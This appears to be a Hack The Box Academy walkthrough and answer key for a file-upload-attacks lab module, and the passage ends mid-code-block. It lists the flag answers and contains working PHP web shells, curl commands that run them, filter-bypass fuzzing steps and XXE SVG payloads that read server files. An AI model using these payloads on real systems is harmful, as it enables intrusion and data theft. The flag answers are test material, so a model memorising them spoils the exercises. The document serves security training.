# File Upload Attacks Module

![[cheatsheat-File Upload Attacks]]

## Section Questions and their Answers

|Section|Question Number|Answer|
|---|---|---|
|Absent Validation|Question 1|fileuploadsabsentverification|
|Upload Exploitation|Question 1|HTB{g07_my_f1r57_w3b_5h3ll}|
|Client-Side Validation|Question 1|HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}|
|Blacklist Filters|Question 1|HTB{1_c4n_n3v3r_b3_bl4ckl1573d}|
|Whitelist Filters|Question 1|HTB{1_wh173l157_my53lf}|
|Type Filters|Question 1|HTB{m461c4l_c0n73n7_3xpl0174710n}|
|Limited File Uploads|Question 1|HTB{my_1m4635_4r3_l37h4l}|
|Limited File Uploads|Question 2|./images/|
|Skills Assessment - File Upload Attacks|Question 1|HTB{m4573r1ng_upl04d_3xpl0174710n}|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Absent Validation

## Question 1

### "Try to upload a PHP script that executes the \(hostname\) command on the back-end server, and submit the first word of it as the answer."

After spawning the target machine, students need to upload a PHP script that will execute the `hostname` command on the back-end server, such as with the payload:

Code: php

```php
<?php system('hostname'); ?>
```

Code: shell

```shell
cat << EOF > RCE.php
<?php system('hostname'); ?>
EOF
```

```shell-session
┌─[us-academy-1]─[10.10.14.142]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat << EOF > RCE.php
> <?php system('hostname'); ?>
> EOF
```

![File_Upload_Attacks_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_1.png)

After successfully uploading the PHP script, students need to navigate to the `/uploads/` directory and specify the name of the script uploaded so that it gets executed to find the first word, `http://STMIP:STMPO/uploads/RCE.php`:

![File_Upload_Attacks_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_2.png)

Answer: `fileuploadsabsentverification`

# Upload Exploitation

## Question 1

### "Try to exploit the upload feature to upload a web shell and get the content of /flag.txt"

After spawning the target machine, students need to upload one of the shown web shells in the module's section, such as:

Code: php

```php
<?php system($_REQUEST['cmd']); ?>
```

Code: shell

```shell
cat << 'EOF' > RCE.php
<?php system($_REQUEST['cmd']); ?>
EOF
```

```shell-session
┌─[us-academy-1]─[10.10.14.142]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat << 'EOF' > RCE.php
> <?php system($_REQUEST['cmd']); ?>
> EOF
```

![File_Upload_Attacks_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_3.png)

After successfully uploading the web shell, students can either use the browser or `cURL` to attain the flag; the latter will be used:

Code: shell

```shell
curl -s http://STMIP:STMPO/uploads/RCE.php?cmd=cat+/flag.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.142]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s 'http://46.101.2.216:30263/uploads/RCE.php?cmd=cat+/flag.txt'

HTB{g07_my_f1r57_w3b_5h3ll}
```

Answer: `HTB{g07_my_f1r57_w3b_5h3ll}`

# Client-Side Validation

## Question 1

### "Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt \(try both bypass methods for better practice\)"

Students need to use an intercepting proxy such as `Burp Suite` and/or the browser to bypass the client-side type validations. `Burp Suite` will be used first then the browser method.

After launching `Burp Suite` and making sure that the `FoxyProxy` plugin is set to the "Burp (8080)" profile, students need to upload any image then intercept the request:

![File_Upload_Attacks_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_4.png)

In the intercepted request, students to change "filename" to a different name that will hold the web shell code, such as "WebShell.php", additionally, students need to take out the image contents and replace it with a simple web shell:

Code: php

```php
<?php system($_REQUEST['cmd']); ?>
```

![File_Upload_Attacks_Walkthrough_Image_5.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_5.png)

After forwarding the request, students need to invoke the web shell under the `/profile_images/` directory, using the name they have given it as the value for "filename" in the modified intercepted request, `http://STMIP:STMPO/profile_images/WebShell.php?cmd=cat+/flag.txt`:

![File_Upload_Attacks_Walkthrough_Image_6.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_6.png)

For the browser method, students need to press (`Ctrl` + `Shift` + `C`) then click with the cursor on the profile image:

![File_Upload_Attacks_Walkthrough_Image_7.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_7.png)

In the form tag with the ID "uploadForm", students need to change "onSubmit" to be only "upload()", and, in the input tag with the ID "uploadFile", students need to remove `accept=".jpg,.jpeg,.png"`:

![File_Upload_Attacks_Walkthrough_Image_8.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_8.png)

Now that the client-side validation has been disabled, students can proceed to upload a web shell regularly, as done previously.

Answer: `HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}`

# Blacklist Filters

## Question 1

### "Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt""

After spawning the target machine, students need to visit its website's root page and upload any image so that the sent request can be intercepted by `Burp Suite`:

![File_Upload_Attacks_Walkthrough_Image_9.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_9.png)

Students then need to send the request to `Intruder` (`Ctrl` + `I`), change "filename" to be `RCE§.php§`, and change the content of the image to instead fetch the flag file if a request succeeds:

Code: php

```php
<?php system('cat /flag.txt'); ?>
```

![File_Upload_Attacks_Walkthrough_Image_10.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_10.png)

Then, students need to copy the items of the [PHP extensions.lst](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) list and paste them under `Payload Options`:

![File_Upload_Attacks_Walkthrough_Image_11.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_11.png)

Students need to also disable URL encoding, then click `Start Attack`:

![File_Upload_Attacks_Walkthrough_Image_12.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_12.png)

After the attack finishes, students need to sort the results by "Length", and will find that responses with a length of `193` have a message of "File successfully uploaded":

![File_Upload_Attacks_Walkthrough_Image_13.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_13.png)

Thus, students then need to create a web shell with the `.phar` extension with the following payload and then upload it as done previously:

Code: php

```php
<?php system($_REQUEST['cmd']); ?>
```

![File_Upload_Attacks_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_14.png)

After forwarding the request, students can either use `cURL` or the browser to fetch the flag file; `cURL` will be used:

Code: shell

```shell
curl -s http://STMIP:STMPO/profile_images/WebShell.phar?cmd=cat+/flag.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.142]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s "http://206.189.124.56:32615/profile_images/WebShell.phar?cmd=cat+/flag.txt"

HTB{1_c4n_n3v3r_b3_bl4ckl1573d}
```

Answer: `HTB{1_c4n_n3v3r_b3_bl4ckl1573d}`

# Whitelist Filters

## Question 1

### "The above exercise employs a blacklist and a whitelist test, to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt""

After spawning the target machine, if students attempt to repeat the attack with `Intruder` as done for the previous question of the "Blacklist Filters" section, they will notice that only files ending with an image extension are allowed, thus they can not use a `basic double extension attack`. Instead, students need to use the `reverse double extension` method, which works on misconfigured Apache web servers.

If students attempt to upload a web shell file with the name "shell.php.jpg" (for example), they will get back "extension not allowed":

![File_Upload_Attacks_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_15.png)

![File_Upload_Attacks_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_16.png)

This signifies that the blacklist filter is blocking PHP files, thus, students need to fuzz for allowed extensions with `Burp Suite's Intruder`. After starting `Burp Suite` and making sure that FoxyProxy is set to the preconfigured "Burp (8080)" option, students need to upload a PHP script that will attempt to read the flag file, and most importantly, has the extension(s) of `.php.jpg`:

Code: php

```php
<?php system('cat /flag.txt'); ?>
```

```shell-session
┌─[us-academy-1]─[10.10.14.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat readFlag.php.jpg

<?php system('cat /flag.txt'); ?>
```

After intercepting the request sent when clicking on the "Upload" button and sending it to `Intruder`, students need to click on "Positions", then click on "Clear §", and at last click on "Add §" between `.php`:

![File_Upload_Attacks_Walkthrough_Image_17.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_17.png)

Students then need to copy the items of this PHP extensions list from [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and paste them under "Payload Options":

![File_Upload_Attacks_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_18.png)

Additionally, students need to disable URL-encoding:

![File_Upload_Attacks_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_19.png)

After clicking on "Start Attack", students will get multiple successful uploads, such as with the `.phar` extension:

![File_Upload_Attacks_Walkthrough_Image_20.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_20.png)

Since the file has been uploaded successfully, students at last need to use either `cURL` or the browser to attain the flag from the URL `http://STMIP:STMPO/profile_images/readFlag.phar.jpg`:

![File_Upload_Attacks_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_21.png)

Answer: `HTB{1_wh173l157_my53lf}`

# Type Filters

## Question 1

### "The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"

After spawning the target machine, students first need to upload any normal picture to intercept the request sent using `Burp Suite` and send it to `Repeater`, so that they can know what type of filters are in place:

![File_Upload_Attacks_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_22.png)

![File_Upload_Attacks_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_23.png)

Students can either keep the current value of the `Content-Type` header or change it to `image/gif`. However, for the file content, students need to make it as `GIF8`, thus making its signature as a `GIF` image:

![File_Upload_Attacks_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_24.png)

On a new line, students need to add PHP code that will print out the flag file:

Code: php

```php
<?php system('cat /flag.txt'); ?>
```

![File_Upload_Attacks_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_25.png)

After clicking on the "Send" button, students will notice that the file will be successfully uploaded, thus they bypassed both the `Content-Type` and `File Content` filters:

![File_Upload_Attacks_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_26.png)

Students now need to bypass the whitelist and blacklist filters, thus, they need to send the request to `Intruder` (`Ctrl`+ `I`), click on "Clear §", then add `§` between `.jpg`:

![File_Upload_Attacks_Walkthrough_Image_27.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_27.png)

Students then need to copy the items of this PHP extensions list from [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and paste them under "Payload Options":

![File_Upload_Attacks_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_18.png)

Additionally, students need to disable URL-encoding:

![File_Upload_Attacks_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_19.png)

After clicking on "Start Attack", students will not get useful hits, as only images get uploaded, and none of them can execute code. However, students will notice that there are few PHP extensions that do not get blocked by the blacklist filter, as they show a different response from "Extension not allowed", which is "Only images are allowed", such as the case with the with the `.phar` extension:

![File_Upload_Attacks_Walkthrough_Image_28.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_28.png)

Students now need to use the `double extension` method, making the file name `cat.jpg.phar` in `Repeater` and sending the modified intercepted request:

![File_Upload_Attacks_Walkthrough_Image_29.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_29.png)

Since the file has been uploaded successfully, students at last need to use either `cURL` or the browser to attain the flag from the URL:

Code: shell

```shell
http://STMIP:STMPO/profile_images/cat.jpg.phar
```

![File_Upload_Attacks_Walkthrough_Image_30.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_30.png)

Answer: `HTB{m461c4l_c0n73n7_3xpl0174710n}`

# Limited File Uploads

## Question 1

### "The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt""

After spawning the target machine, students need to use one of the `SVG upload attacks`, such that if the web application of the spawned target machine uses an outdated library or function, it can be exploited with `XXE` to read the flag. Students need to write to a file with the `.svg` extension the following XXE/XML payload:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/flag.txt"> ]>
<svg>&xxe;</svg>
```

![File_Upload_Attacks_Walkthrough_Image_31.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_31.png)

After successfully uploading the file, students need to view the page source to find the flag within the `<svg>`" element on line 19:

![File_Upload_Attacks_Walkthrough_Image_32.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_32.png)

Answer: `HTB{my_1m4635_4r3_l37h4l}`

# Limited File Uploads

## Question 2

### "Try to read the source code of 'upload,php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)"

After spawning the target machine and trying to upload a file to it, students will notice that it does not disclose its uploads directory, thus, students need to read the source code of `upload.php`, which should contain the uploads directory. Students need to write to a file with the `.svg` extension the following `XXE/XML` payload that utilizes the PHP filter `convert.base64-encode`:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

![File_Upload_Attacks_Walkthrough_Image_33.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_33.png)

After successfully uploading the file, students need to view the page source to source code within the `<svg>` element on line 19 (in case students are not getting the source code, but instead the flag from the previous question, they need to respawn the target machine and upload the payload again):

![File_Upload_Attacks_Walkthrough_Image_34.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_34.png)

Subsequently, students need to base64-decode the encoded source code:

Code: shell

```shell
echo "PD9waHAKJHRhcmdldF9kaXIgPSAiLi9pbWFnZXMvIjsKJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1sidXBsb2FkRmlsZSJdWyJuYW1lIl0pOwokdGFyZ2V0X2ZpbGUgPSAkdGFyZ2V0X2RpciAuICRmaWxlTmFtZTsKJGNvbnRlbnRUeXBlID0gJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0eXBlJ107CiRNSU1FdHlwZSA9IG1pbWVfY29udGVudF90eXBlKCRfRklMRVNbJ3VwbG9hZEZpbGUnXVsndG1wX25hbWUnXSk7CgppZiAoIXByZWdfbWF0Y2goJy9eLipcLnN2ZyQvJywgJGZpbGVOYW1lKSkgewogICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9Cgpmb3JlYWNoIChhcnJheSgkY29udGVudFR5cGUsICRNSU1FdHlwZSkgYXMgJHR5cGUpIHsKICAgIGlmICghaW5fYXJyYXkoJHR5cGUsIGFycmF5KCdpbWFnZS9zdmcreG1sJykpKSB7CiAgICAgICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgICAgICBkaWUoKTsKICAgIH0KfQoKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICRsYXRlc3QgPSBmb3BlbigkdGFyZ2V0X2RpciAuICJsYXRlc3QueG1sIiwgInciKTsKICAgIGZ3cml0ZSgkbGF0ZXN0LCBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSkpOwogICAgZmNsb3NlKCRsYXRlc3QpOwogICAgZWNobyAiRmlsZSBzdWNjZXNzZnVsbHkgdXBsb2FkZWQiOwp9IGVsc2UgewogICAgZWNobyAiRmlsZSBmYWlsZWQgdG8gdXBsb2FkIjsKfQo=" | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.14.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo "PD9waHAKJHRhcmdldF9kaXIgPSAiLi9pbWFnZXMvIjsKJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1sidXBsb2FkRmlsZSJdWyJuYW1lIl0pOwokdGFyZ2V0X2ZpbGUgPSAkdGFyZ2V0X2RpciAuICRmaWxlTmFtZTsKJGNvbnRlbnRUeXBlID0gJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0eXBlJ107CiRNSU1FdHlwZSA9IG1pbWVfY29udGVudF90eXBlKCRfRklMRVNbJ3VwbG9hZEZpbGUnXVsndG1wX25hbWUnXSk7CgppZiAoIXByZWdfbWF0Y2goJy9eLipcLnN2ZyQvJywgJGZpbGVOYW1lKSkgewogICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9Cgpmb3JlYWNoIChhcnJheSgkY29udGVudFR5cGUsICRNSU1FdHlwZSkgYXMgJHR5cGUpIHsKICAgIGlmICghaW5fYXJyYXkoJHR5cGUsIGFycmF5KCdpbWFnZS9zdmcreG1sJykpKSB7CiAgICAgICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgICAgICBkaWUoKTsKICAgIH0KfQoKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICRsYXRlc3QgPSBmb3BlbigkdGFyZ2V0X2RpciAuICJsYXRlc3QueG1sIiwgInciKTsKICAgIGZ3cml0ZSgkbGF0ZXN0LCBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSkpOwogICAgZmNsb3NlKCRsYXRlc3QpOwogICAgZWNobyAiRmlsZSBzdWNjZXNzZnVsbHkgdXBsb2FkZWQiOwp9IGVsc2UgewogICAgZWNobyAiRmlsZSBmYWlsZWQgdG8gdXBsb2FkIjsKfQo=" | base64 -d

<?php
$target_dir = "./images/";
$fileName = basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!preg_match('/^.*\.svg$/', $fileName)) {
    echo "Only SVG images are allowed";
    die();
}

foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/svg+xml'))) {
        echo "Only SVG images are allowed";
        die();
    }
}

if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    $latest = fopen($target_dir . "latest.xml", "w");
    fwrite($latest, basename($_FILES["uploadFile"]["name"]));
    fclose($latest);
    echo "File successfully uploaded";
} else {
    echo "File failed to upload";
}
```

Students at last will know that the upload directory is the value of the `target_dir` variable, which is `./images/`.

Answer: `./images/`

# Skills Assessment - File Upload Attacks

## Question 1

### "Try to exploit the upload form to read the flag found at the root directory "/"."

After spawning the target machine, students need to visit its website's root page and click on "Contact Us", where images can be uploaded:

![File_Upload_Attacks_Walkthrough_Image_35.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_35.png)

When students try to upload an image, it gets uploaded and displayed directly after clicking the green icon, without having to submit the form, thus, students need not click on "SUBMIT":

![File_Upload_Attacks_Walkthrough_Image_36.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_36.png)

Checking the uploaded image's link, students will notice that it is saved as a base64 string, with its full path not being disclosed, thus, the uploads directory can't be determined:

![File_Upload_Attacks_Walkthrough_Image_37.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_37.png)

Subsequently, students need to start `Burp Suite`, set `FoxyProxy` to the preconfigured "BURP" profile, and click on the green icon to intercept the image upload request and send it to `Intruder` (`Ctrl` + `I`):

![File_Upload_Attacks_Walkthrough_Image_38.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_38.png)

After clearing the default payload markers, students need to test for whitelisted extensions by adding a payload marker before the dot, such that it becomes `§.jpg§`:

![File_Upload_Attacks_Walkthrough_Image_39.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_39.png)

Then, students need to uncheck "URL-encode these characters", copy the items of the [PHP extensions.lst](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) list and paste them under `Payload Options`, then click "Start attack":

![File_Upload_Attacks_Walkthrough_Image_40.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_40.png)

![File_Upload_Attacks_Walkthrough_Image_41.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_41.png)

Students will notice that the responses for the requests of extensions `.pht`, `.phtm`, `.phar`, and `.pgif` don't contain "Extension not allowed" but rather "Only images are allowed":

![File_Upload_Attacks_Walkthrough_Image_42.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_42.png)

Thus, students need to choose one of the extensions to attempt bypassing the whitelist test, `.phar` will be used. Because any file with an extension not ending with that of an image can't be uploaded, the best attempt students can take is to name a shell file as `shell.phar.jpg`. However, this file can only be uploaded if the `Content-Type` header of the original image is not modified. Therefore, students need to fuzz the `Content-Type` header value. First, students need to add a payload marker around the value of `Content-Type`, such that it becomes `§image/jpeg§`:

![File_Upload_Attacks_Walkthrough_Image_43.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_43.png)

Then, students need to download [web-all-content-types.txt](https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt):

Code: shell

```shell
wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt--2022-11-30 05:03:37--  https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt

Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-all-content-types.txt [following]
--2022-11-30 05:03:37--  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-all-content-types.txt
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 58204 (57K) [text/plain]
Saving to: ‘web-all-content-types.txt’

web-all-content-types.txt    100%[==============================================>]  56.84K  --.-KB/s    in 0.001s  

2022-11-30 05:03:37 (59.6 MB/s) - ‘web-all-content-types.txt’ saved [58204/58204]
```

Subsequently, students need only to have content types that contain `image/`, so they need to use `grep`, copy the matching ones to the clipboard, and then paste them under "Payload Options" in `Burp Suite`:

Code: shell

```shell
cat web-all-content-types.txt | grep 'image/' | xclip -se c
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ cat web-all-content-types.txt | grep 'image/' | xclip -se c
```

![File_Upload_Attacks_Walkthrough_Image_44.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_44.png)

After clicking on "Start attack" (and making sure that "URL-encode these characters" is unchecked), students will notice that most responses are 190 bytes in size, containing the message "Only images are allowed", however, the responses for `image/jpg`, `image/jpeg`, `image/png`, and `image/svg+xml` are an exception, as the images got uploaded successfully:

![File_Upload_Attacks_Walkthrough_Image_45.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_45.png)

Since SVG images are allowed, and the uploaded images get reflected to the students, they need to attempt an SVG attack by creating an image called `shell.svg` with the following content to read the source code of the file `upload.php`:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>
```

Students can use `cat` to save the `XML` code into a file:

Code: shell

```shell
cat << 'EOF' > shell.svg
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>
EOF
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ cat << 'EOF' > shell.svg
> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>
> EOF
```

Subsequently, students need to upload `shell.svg`, however, when attempting to, they will receive the message "only images are allowed". To bypass this, students can change the extension from `.svg` to `.jpeg`:

Code: shell

```shell
mv shell.svg shell.jpeg
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ mv shell.svg shell.jpeg
```

![File_Upload_Attacks_Walkthrough_Image_46.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_46.png)

However, in the intercepted request, students need to change the filename to have the `.svg` extension and `Content-Type` to be `image/svg+xml`:

![File_Upload_Attacks_Walkthrough_Image_47.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_47.png)

After forwarding the request and checking its response, students will notice that they have the base64-encoded version of `upload.php`, thus, they need to decode it:

![File_Upload_Attacks_Walkthrough_Image_48.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_48.png)

Code: shell

```shell
